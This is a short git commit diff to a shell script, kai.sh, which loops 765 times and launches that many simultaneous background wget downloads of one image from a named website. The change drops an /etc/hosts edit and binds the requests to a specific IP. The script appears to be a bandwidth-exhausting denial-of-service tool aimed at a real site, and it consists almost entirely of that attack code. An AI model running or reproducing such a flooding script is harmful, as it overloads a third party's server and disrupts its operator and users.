fe2504a07610468187b1a43b694bb74e070de1e8
xjh2009 <102580788+xjh2009@users.noreply.github.com>
2024-02-16 21:13:23 +0800

    Update kai.sh

--- kai.sh
+++ kai.sh
@@ -1,6 +1,5 @@
-echo "154.7.177.145 idc01.bf" >> /etc/hosts
 for ((i=1; i<=765; i++))  
 do  
-nohup wget -O sbzp http://idcef.com/themes/clientarea/IDC01/assets/images/sec1.jpg > /x${i}-start.log 2>&1 &
+nohup wget -O sbzp http://idcef.com/themes/clientarea/IDC01/assets/images/sec1.jpg --bind-address=154.7.177.145 > x${i}-start.log 2>&1 &
 done
 echo ok
